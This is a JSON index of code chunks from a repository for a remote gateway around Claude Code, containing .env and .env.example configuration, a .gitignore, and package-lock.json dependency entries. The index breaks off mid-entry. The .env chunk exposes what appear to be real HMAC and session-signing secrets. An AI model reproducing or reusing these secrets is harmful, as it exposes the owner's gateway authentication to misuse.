{"version": 2, "root": "C:\\Users\\TimShelton\\source\\repos\\AiRemoteCoder", "chunks": [{"corpus": "code", "source": ".env", "location": ".env:1", "score": 0.0, "content": "# Gateway Configuration\nGATEWAY_PORT=3100\nGATEWAY_HOST=0.0.0.0\n\n# Security\nHMAC_SECRET=24f306ed8bbe7d2bc28d6ba08ec1775c17afaa21c6454409f577a1bfb54cfee5\nAUTH_SECRET=be92790e72f038087aeb6a91c20b36ba8bd5011632e8b355707fe86ad0cf219d\n\n# TLS (generate with: .\\scripts\\dev-cert.ps1)\nTLS_ENABLED=true\n\n# Cloudflare Access (optional)\n# CF_ACCESS_TEAM=your-team\n# CF_ACCESS_AUD=your-aud\n\n# Retention\nRUN_RETENTION_DAYS=30\n\n# Wrapper Configuration\nGATEWAY_URL=https://localhost:3100\nALLOW_SELF_SIGNED=true", "metadata": {"file": ".env", "start_line": 1, "end_line": 21, "language": "text"}}, {"corpus": "code", "source": ".env.example", "location": ".env.example:1", "score": 0.0, "content": "# =============================================================================\n# Claude Code Connect-Back Gateway Configuration\n# =============================================================================\n# Copy this file to .env and customize as needed.\n# Secrets will be auto-generated on first run if not provided.\n# =============================================================================\n\n# -----------------------------------------------------------------------------\n# Gateway Server\n# -----------------------------------------------------------------------------\nGATEWAY_PORT=3100\nGATEWAY_HOST=0.0.0.0\n\n# -----------------------------------------------------------------------------\n# Security Secrets (REQUIRED - auto-generated if empty)\n# -----------------------------------------------------------------------------\n# HMAC secret for wrapper authentication (min 32 chars)\nHMAC_SECRET=\n\n# Session signing secret for UI authentication (min 32 chars)\nAUTH_SECRET=\n\n# -----------------------------------------------------------------------------\n# TLS Configuration\n# -----------------------------------------------------------------------------\n# Enable HTTPS (recommended: true)\nTLS_ENABLED=true\n\n# Custom certificate paths (optional, defaults to .data/certs/)\n# TLS_CERT=.data/certs/server.crt\n# TLS_KEY=.data/certs/server.key\n\n# -----------------------------------------------------------------------------\n# Cloudflare Access (Optional - for secure remote access)\n# -----------------------------------------------------------------------------\n# Your Cloudflare Access team name (e.g., \"mycompany\")\n# CF_ACCESS_TEAM=\n\n# Your Cloudflare Access application AUD (audience tag)\n# CF_ACCESS_AUD=\n\n# -----------------------------------------------------------------------------\n# Retention Policy\n# -----------------------------------------------------------------------------\n# Number of days to keep completed runs (default: 30)\nRUN_RETENTION_DAYS=30\n\n# -----------------------------------------------------------------------------\n# Wrapper Configuration\n# -----------------------------------------------------------------------------\n# Gateway URL for the wrapper to connect to\nGATEWAY_URL=https://localhost:3100\n\n# Allow self-signed certificates (dev only)\nALLOW_SELF_SIGNED=true\n\n# Claude Code command (if not in PATH)\n# CLAUDE_COMMAND=claude\n\n# Command polling interval in milliseconds\n# COMMAND_POLL_INTERVAL=2000\n\n# Heartbeat interval in milliseconds\n# HEARTBEAT_INTERVAL=30000\n\n# tmate command (for assist sessions)\n# TMATE_COMMAND=tmate\n\n# -----------------------------------------------------------------------------\n# Additional Allowed Commands (comma-separated)\n# -----------------------------------------------------------------------------\n# Add custom commands to the allowlist\n# EXTRA_ALLOWED_COMMANDS=make build,make test,./my-script.sh\n\n# -----------------------------------------------------------------------------\n# Logging\n# -----------------------------------------------------------------------------\n# Log level: fatal, error, warn, info, debug, trace\nLOG_LEVEL=info", "metadata": {"file": ".env.example", "start_line": 1, "end_line": 79, "language": "example"}}, {"corpus": "code", "source": ".gitignore", "location": ".gitignore:1", "score": 0.0, "content": "# Dependencies\nnode_modules/\n\n# Build output\ndist/\nbuild/\n\n# Runtime data\n.data/\n\n# Environment\n.env\n.env.local\n.env.*.local\n\n# IDE\n.idea/\n.vscode/\n*.swp\n*.swo\n*~\n\n# OS\n.DS_Store\nThumbs.db\n\n# Logs\n*.log\nnpm-debug.log*\nyarn-debug.log*\nyarn-error.log*\n\n# Test\ncoverage/\n.nyc_output/\n\n# Misc\n*.tgz\n*.tar.gz", "metadata": {"file": ".gitignore", "start_line": 1, "end_line": 39, "language": "text"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1", "score": 0.0, "content": "{\n  \"name\": \"ai-remote-coder\",\n  \"version\": \"1.1.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"ai-remote-coder\",\n      \"version\": \"1.1.0\",\n      \"workspaces\": [\n        \"gateway\",\n        \"wrapper\",\n        \"ui\"\n      ],\n      \"devDependencies\": {\n        \"concurrently\": \"^8.2.2\",\n        \"typescript\": \"^5.3.3\"\n      },\n      \"engines\": {\n        \"node\": \">=20.0.0\"\n      }\n    },\n    \"gateway\": {\n      \"name\": \"@ai-remote-coder/gateway\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"@fastify/cookie\": \"^9.2.0\",\n        \"@fastify/cors\": \"^9.0.1\",\n        \"@fastify/helmet\": \"^11.1.1\",\n        \"@fastify/multipart\": \"^8.1.0\",\n        \"@fastify/rate-limit\": \"^9.1.0\",\n        \"@fastify/static\": \"^7.0.1\",\n        \"@fastify/websocket\": \"^10.0.1\",\n        \"argon2\": \"^0.31.2\",\n        \"better-sqlite3\": \"^11.3.0\",\n        \"dotenv\": \"^16.3.1\",\n        \"fastify\": \"^4.25.2\",\n        \"nanoid\": \"^5.0.4\",\n        \"otplib\": \"^12.0.1\",\n        \"pino\": \"^8.17.2\",\n        \"pino-pretty\": \"^10.3.1\",\n        \"zod\": \"^3.22.4\"\n      },\n      \"devDependencies\": {\n        \"@types/better-sqlite3\": \"^7.6.8\",\n        \"@types/node\": \"^20.10.6\",\n        \"@types/ws\": \"^8.5.10\",\n        \"tsx\": \"^4.7.0\",\n        \"typescript\": \"^5.3.3\",\n        \"vitest\": \"^1.1.3\"\n      }\n    },\n    \"node_modules/@ai-remote-coder/gateway\": {\n      \"resolved\": \"gateway\",\n      \"link\": true\n    },\n    \"node_modules/@ai-remote-coder/ui\": {\n      \"resolved\": \"ui\",\n      \"link\": true\n    },\n    \"node_modules/@ai-remote-coder/wrapper\": {\n      \"resolved\": \"wrapper\",\n      \"link\": true\n    },\n    \"node_modules/@babel/code-frame\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.28.6.tgz\",\n      \"integrity\": \"sha512-JYgintcMjRiCvS8mMECzaEn+m3PfoQiyqukOMCCVQtoJGYJw8j/8LBJEiqkHLkfwCcs74E3pbAUFNg7d9VNJ+Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/helper-validator-identifier\": \"^7.28.5\",\n        \"js-tokens\": \"^4.0.0\",\n        \"picocolors\": \"^1.1.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/compat-data\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/compat-data/-/compat-data-7.28.6.tgz\",\n      \"integrity\": \"sha512-2lfu57JtzctfIrcGMz992hyLlByuzgIk58+hhGCxjKZ3rWI82NnVLjXcaTqkI2NvlcvOskZaiZ5kjUALo3Lpxg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/core\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/core/-/core-7.28.6.tgz\",\n      \"integrity\": \"sha512-H3mcG6ZDLTlYfaSNi0iOKkigqMFvkTKlGUYlD8GW7nNOYRrevuA46iTypPyv+06V3fEmvvazfntkBU34L0azAw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/code-frame\": \"^7.28.6\",\n        \"@babel/generator\": \"^7.28.6\",\n        \"@babel/helper-compilation-targets\": \"^7.28.6\",\n        \"@babel/helper-module-transforms\": \"^7.28.6\",\n        \"@babel/helpers\": \"^7.28.6\",\n        \"@babel/parser\": \"^7.28.6\",\n        \"@babel/template\": \"^7.28.6\",\n        \"@babel/traverse\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\",\n        \"@jridgewell/remapping\": \"^2.3.5\",\n        \"convert-source-map\": \"^2.0.0\",\n        \"debug\": \"^4.1.0\",\n        \"gensync\": \"^1.0.0-beta.2\",\n        \"json5\": \"^2.2.3\",\n        \"semver\": \"^6.3.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      },\n      \"funding\": {\n        \"type\": \"opencollective\",\n        \"url\": \"https://opencollective.com/babel\"\n      }\n    },\n    \"node_modules/@babel/generator\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/generator/-/generator-7.28.6.tgz\",\n      \"integrity\": \"sha512-lOoVRwADj8hjf7al89tvQ2a1lf53Z+7tiXMgpZJL3maQPDxh0DgLMN62B2MKUOFcoodBHLMbDM6WAbKgNy5Suw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/parser\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\",\n        \"@jridgewell/gen-mapping\": \"^0.3.12\",\n        \"@jridgewell/trace-mapping\": \"^0.3.28\",\n        \"jsesc\": \"^3.0.2\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-compilation-targets\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-compilation-targets/-/helper-compilation-targets-7.28.6.tgz\",\n      \"integrity\": \"sha512-JYtls3hqi15fcx5GaSNL7SCTJ2MNmjrkHXg4FSpOA/grxK8KwyZ5bubHsCq8FXCkua6xhuaaBit+3b7+VZRfcA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/compat-data\": \"^7.28.6\",\n        \"@babel/helper-validator-option\": \"^7.27.1\",\n        \"browserslist\": \"^4.24.0\",\n        \"lru-cache\": \"^5.1.1\",\n        \"semver\": \"^6.3.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-globals\": {\n      \"version\": \"7.28.0\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-globals/-/helper-globals-7.28.0.tgz\",\n      \"integrity\": \"sha512-+W6cISkXFa1jXsDEdYA8HeevQT/FULhxzR99pxphltZcVaugps53THCeiWA8SguxxpSp3gKPiuYfSWopkLQ4hw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-module-imports\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-module-imports/-/helper-module-imports-7.28.6.tgz\",\n      \"integrity\": \"sha512-l5XkZK7r7wa9LucGw9LwZyyCUscb4x37JWTPz7swwFE/0FMQAGpiWUZn8u9DzkSBWEcK25jmvubfpw2dnAMdbw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/traverse\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-module-transforms\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-module-transforms/-/helper-module-transforms-7.28.6.tgz\",\n      \"integrity\": \"sha512-67oXFAYr2cDLDVGLXTEABjdBJZ6drElUSI7WKp70NrpyISso3plG9SAGEF6y7zbha/wOzUByWWTJvEDVNIUGcA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/helper-module-imports\": \"^7.28.6\",\n        \"@babel/helper-validator-identifier\": \"^7.28.5\",\n        \"@babel/traverse\": \"^7.28.6\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      },\n      \"peerDependencies\": {\n        \"@babel/core\": \"^7.0.0\"\n      }\n    },\n    \"node_modules/@babel/helper-plugin-utils\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-plugin-utils/-/helper-plugin-utils-7.28.6.tgz\",\n      \"integrity\": \"sha512-S9gzZ/bz83GRysI7gAD4wPT/AI3uCnY+9xn+Mx/KPs2JwHJIz1W8PZkg2cqyt3RNOBM8ejcXhV6y8Og7ly/Dug==\",", "metadata": {"file": "package-lock.json", "start_line": 1, "end_line": 200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:201", "score": 0.0, "content": "      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-string-parser\": {\n      \"version\": \"7.27.1\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-string-parser/-/helper-string-parser-7.27.1.tgz\",\n      \"integrity\": \"sha512-qMlSxKbpRlAridDExk92nSobyDdpPijUq2DW6oDnUqd0iOGxmQjyqhMIihI9+zv4LPyZdRje2cavWPbCbWm3eA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-validator-identifier\": {\n      \"version\": \"7.28.5\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-validator-identifier/-/helper-validator-identifier-7.28.5.tgz\",\n      \"integrity\": \"sha512-qSs4ifwzKJSV39ucNjsvc6WVHs6b7S03sOh2OcHF9UHfVPqWWALUsNUVzhSBiItjRZoLHx7nIarVjqKVusUZ1Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helper-validator-option\": {\n      \"version\": \"7.27.1\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helper-validator-option/-/helper-validator-option-7.27.1.tgz\",\n      \"integrity\": \"sha512-YvjJow9FxbhFFKDSuFnVCe2WxXk1zWc22fFePVNEaWJEu8IrZVlda6N0uHwzZrUM1il7NC9Mlp4MaJYbYd9JSg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/helpers\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/helpers/-/helpers-7.28.6.tgz\",\n      \"integrity\": \"sha512-xOBvwq86HHdB7WUDTfKfT/Vuxh7gElQ+Sfti2Cy6yIWNW05P8iUslOVcZ4/sKbE+/jQaukQAdz/gf3724kYdqw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/template\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/parser\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/parser/-/parser-7.28.6.tgz\",\n      \"integrity\": \"sha512-TeR9zWR18BvbfPmGbLampPMW+uW1NZnJlRuuHso8i87QZNq2JRF9i6RgxRqtEq+wQGsS19NNTWr2duhnE49mfQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/types\": \"^7.28.6\"\n      },\n      \"bin\": {\n        \"parser\": \"bin/babel-parser.js\"\n      },\n      \"engines\": {\n        \"node\": \">=6.0.0\"\n      }\n    },\n    \"node_modules/@babel/plugin-transform-react-jsx-self\": {\n      \"version\": \"7.27.1\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/plugin-transform-react-jsx-self/-/plugin-transform-react-jsx-self-7.27.1.tgz\",\n      \"integrity\": \"sha512-6UzkCs+ejGdZ5mFFC/OCUrv028ab2fp1znZmCZjAOBKiBK2jXD1O+BPSfX8X2qjJ75fZBMSnQn3Rq2mrBJK2mw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/helper-plugin-utils\": \"^7.27.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      },\n      \"peerDependencies\": {\n        \"@babel/core\": \"^7.0.0-0\"\n      }\n    },\n    \"node_modules/@babel/plugin-transform-react-jsx-source\": {\n      \"version\": \"7.27.1\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/plugin-transform-react-jsx-source/-/plugin-transform-react-jsx-source-7.27.1.tgz\",\n      \"integrity\": \"sha512-zbwoTsBruTeKB9hSq73ha66iFeJHuaFkUbwvqElnygoNbj/jHRsSeokowZFN3CZ64IvEqcmmkVe89OPXc7ldAw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/helper-plugin-utils\": \"^7.27.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      },\n      \"peerDependencies\": {\n        \"@babel/core\": \"^7.0.0-0\"\n      }\n    },\n    \"node_modules/@babel/runtime\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/runtime/-/runtime-7.28.6.tgz\",\n      \"integrity\": \"sha512-05WQkdpL9COIMz4LjTxGpPNCdlpyimKppYNoJ5Di5EUObifl8t4tuLuUBBZEpoLYOmfvIWrsp9fCl0HoPRVTdA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/template\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/template/-/template-7.28.6.tgz\",\n      \"integrity\": \"sha512-YA6Ma2KsCdGb+WC6UpBVFJGXL58MDA6oyONbjyF/+5sBgxY/dwkhLogbMT2GXXyU84/IhRw/2D1Os1B/giz+BQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/code-frame\": \"^7.28.6\",\n        \"@babel/parser\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/traverse\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/traverse/-/traverse-7.28.6.tgz\",\n      \"integrity\": \"sha512-fgWX62k02qtjqdSNTAGxmKYY/7FSL9WAS1o2Hu5+I5m9T0yxZzr4cnrfXQ/MX0rIifthCSs6FKTlzYbJcPtMNg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/code-frame\": \"^7.28.6\",\n        \"@babel/generator\": \"^7.28.6\",\n        \"@babel/helper-globals\": \"^7.28.0\",\n        \"@babel/parser\": \"^7.28.6\",\n        \"@babel/template\": \"^7.28.6\",\n        \"@babel/types\": \"^7.28.6\",\n        \"debug\": \"^4.3.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@babel/types\": {\n      \"version\": \"7.28.6\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/types/-/types-7.28.6.tgz\",\n      \"integrity\": \"sha512-0ZrskXVEHSWIqZM/sQZ4EV3jZJXRkio/WCxaqKZP1g//CEWEPSfeZFcms4XeKBCHU0ZKnIkdJeU/kF+eRp5lBg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/helper-string-parser\": \"^7.27.1\",\n        \"@babel/helper-validator-identifier\": \"^7.28.5\"\n      },\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/@esbuild/aix-ppc64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/aix-ppc64/-/aix-ppc64-0.27.2.tgz\",\n      \"integrity\": \"sha512-GZMB+a0mOMZs4MpDbj8RJp4cw+w1WV5NYD6xzgvzUJ5Ek2jerwfO2eADyI6ExDSUED+1X8aMbegahsJi+8mgpw==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"aix\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/android-arm\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-arm/-/android-arm-0.27.2.tgz\",\n      \"integrity\": \"sha512-DVNI8jlPa7Ujbr1yjU2PfUSRtAUZPG9I1RwW4F4xFB1Imiu2on0ADiI/c3td+KmDtVKNbi+nffGDQMfcIMkwIA==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/android-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-arm64/-/android-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-pvz8ZZ7ot/RBphf8fv60ljmaoydPU12VuXHImtAs0XhLLw+EXBi2BLe3OYSBslR4rryHvweW5gmkKFwTiFy6KA==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,", "metadata": {"file": "package-lock.json", "start_line": 201, "end_line": 400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:401", "score": 0.0, "content": "      \"os\": [\n        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/android-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-x64/-/android-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-z8Ank4Byh4TJJOh4wpz8g2vDy75zFL0TlZlkUkEwYXuPSgX8yzep596n6mT7905kA9uHZsf/o2OJZubl2l3M7A==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/darwin-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-davCD2Zc80nzDVRwXTcQP/28fiJbcOwvdolL0sOiOsbwBa72kegmVU0Wrh1MYrbuCL98Omp5dVhQFWRKR2ZAlg==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/darwin-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/darwin-x64/-/darwin-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-ZxtijOmlQCBWGwbVmwOF/UCzuGIbUkqB1faQRf5akQmxRJ1ujusWsb3CVfk/9iZKr2L5SMU5wPBi1UWbvL+VQA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/freebsd-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/freebsd-arm64/-/freebsd-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-lS/9CN+rgqQ9czogxlMcBMGd+l8Q3Nj1MFQwBZJyoEKI50XGxwuzznYdwcav6lpOGv5BqaZXqvBSiB/kJ5op+g==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/freebsd-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/freebsd-x64/-/freebsd-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-tAfqtNYb4YgPnJlEFu4c212HYjQWSO/w/h/lQaBK7RbwGIkBOuNKQI9tqWzx7Wtp7bTPaGC6MJvWI608P3wXYA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-arm\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-arm/-/linux-arm-0.27.2.tgz\",\n      \"integrity\": \"sha512-vWfq4GaIMP9AIe4yj1ZUW18RDhx6EPQKjwe7n8BbIecFtCQG4CfHGaHuh7fdfq+y3LIA2vGS/o9ZBGVxIDi9hw==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-arm64/-/linux-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-hYxN8pr66NsCCiRFkHUAsxylNOcAQaxSSkHMMjcpx0si13t1LHFphxJZUiGwojB1a/Hd5OiPIqDdXONia6bhTw==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-ia32\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-ia32/-/linux-ia32-0.27.2.tgz\",\n      \"integrity\": \"sha512-MJt5BRRSScPDwG2hLelYhAAKh9imjHK5+NE/tvnRLbIqUWa+0E9N4WNMjmp/kXXPHZGqPLxggwVhz7QP8CTR8w==\",\n      \"cpu\": [\n        \"ia32\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-loong64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-loong64/-/linux-loong64-0.27.2.tgz\",\n      \"integrity\": \"sha512-lugyF1atnAT463aO6KPshVCJK5NgRnU4yb3FUumyVz+cGvZbontBgzeGFO1nF+dPueHD367a2ZXe1NtUkAjOtg==\",\n      \"cpu\": [\n        \"loong64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-mips64el\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-mips64el/-/linux-mips64el-0.27.2.tgz\",\n      \"integrity\": \"sha512-nlP2I6ArEBewvJ2gjrrkESEZkB5mIoaTswuqNFRv/WYd+ATtUpe9Y09RnJvgvdag7he0OWgEZWhviS1OTOKixw==\",\n      \"cpu\": [\n        \"mips64el\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-ppc64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-ppc64/-/linux-ppc64-0.27.2.tgz\",\n      \"integrity\": \"sha512-C92gnpey7tUQONqg1n6dKVbx3vphKtTHJaNG2Ok9lGwbZil6DrfyecMsp9CrmXGQJmZ7iiVXvvZH6Ml5hL6XdQ==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-riscv64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-riscv64/-/linux-riscv64-0.27.2.tgz\",\n      \"integrity\": \"sha512-B5BOmojNtUyN8AXlK0QJyvjEZkWwy/FKvakkTDCziX95AowLZKR6aCDhG7LeF7uMCXEJqwa8Bejz5LTPYm8AvA==\",\n      \"cpu\": [\n        \"riscv64\"", "metadata": {"file": "package-lock.json", "start_line": 401, "end_line": 600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:601", "score": 0.0, "content": "      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-s390x\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-s390x/-/linux-s390x-0.27.2.tgz\",\n      \"integrity\": 